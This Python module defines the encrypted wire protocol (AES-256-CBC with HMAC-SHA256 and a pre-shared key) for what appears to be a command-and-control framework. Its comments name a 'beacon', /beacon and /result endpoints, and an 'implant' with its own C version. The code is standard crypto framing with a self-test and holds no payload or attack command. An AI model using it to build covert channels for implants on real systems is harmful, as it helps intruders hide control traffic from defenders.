"""CMT1 线缆协议：framing + 加密。服务端与 Python 模拟 beacon 公用。

Body 格式（/beacon 与 /result 通用）：
  b"CMT1"(4) | iv(16) | ciphertext(n) | mac(32)
  mac      = HMAC-SHA256(psk, magic + iv + ciphertext)
  ciphertext = AES-256-CBC(psk, iv, PKCS7(plaintext))
  plaintext = UTF-8 JSON

植入体 C 侧（crypto.c）独立实现同一协议，互操作由 E2E 验证。
v1 边界：PSK 预共享、无前向保密；会话密钥轮换在 v2。
"""

from __future__ import annotations

import hmac
import hashlib
import os
import sys

MAGIC = b"CMT1"
IV_LEN = 16
MAC_LEN = 32
KEY_LEN = 32


class ProtocolError(RuntimeError):
    pass


def _cipher():
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

        return Cipher, algorithms, modes
    except ImportError as exc:  # pragma: no cover
        raise ProtocolError("服务端需要 cryptography: pip install cryptography") from exc


def _pad(data: bytes) -> bytes:
    n = 16 - (len(data) % 16)
    return data + bytes([n]) * n


def _unpad(data: bytes) -> bytes:
    if not data or len(data) % 16:
        raise ProtocolError("密文长度非法")
    n = data[-1]
    if not 1 <= n <= 16 or data[-n:] != bytes([n]) * n:
        raise ProtocolError("填充非法")
    return data[:-n]


def seal(psk: bytes, plaintext: bytes, iv: bytes | None = None) -> bytes:
    """加密打包：plaintext → CMT1 body。"""
    Cipher, algorithms, modes = _cipher()
    if len(psk) != KEY_LEN:
        raise ProtocolError(f"psk 必须为 {KEY_LEN} 字节")
    iv = iv or os.urandom(IV_LEN)
    enc = Cipher(algorithms.AES(psk), modes.CBC(iv)).encryptor()
    ciphertext = enc.update(_pad(plaintext)) + enc.finalize()
    mac = hmac.new(psk, MAGIC + iv + ciphertext, hashlib.sha256).digest()
    return MAGIC + iv + ciphertext + mac


def open(psk: bytes, blob: bytes) -> bytes:
    """验 MAC + 解密，失败抛 ProtocolError。"""
    Cipher, algorithms, modes = _cipher()
    if len(blob) < len(MAGIC) + IV_LEN + 16 + MAC_LEN:
        raise ProtocolError("body 过短")
    if blob[: len(MAGIC)] != MAGIC:
        raise ProtocolError("magic 不匹配")
    iv = blob[4 : 4 + IV_LEN]
    ciphertext = blob[4 + IV_LEN : -MAC_LEN]
    mac = blob[-MAC_LEN:]
    expect = hmac.new(psk, MAGIC + iv + ciphertext, hashlib.sha256).digest()
    if not hmac.compare_digest(mac, expect):
        raise ProtocolError("MAC 校验失败（PSK 不匹配或 body 被篡改）")
    dec = Cipher(algorithms.AES(psk), modes.CBC(iv)).decryptor()
    return _unpad(dec.update(ciphertext) + dec.finalize())


def gen_psk() -> bytes:
    return os.urandom(KEY_LEN)


if __name__ == "__main__":  # 协议自测：seal → open 往返 + 篡改拒绝
    psk = gen_psk()
    blob = seal(psk, b'{"hello": "world"}')
    assert open(psk, blob) == b'{"hello": "world"}'
    bad = bytearray(blob)
    bad[10] ^= 0xFF
    try:
        open(psk, bytes(bad))
        sys.exit("FAIL: 篡改未被拒绝")
    except ProtocolError:
        pass
    print("protocol selftest OK")
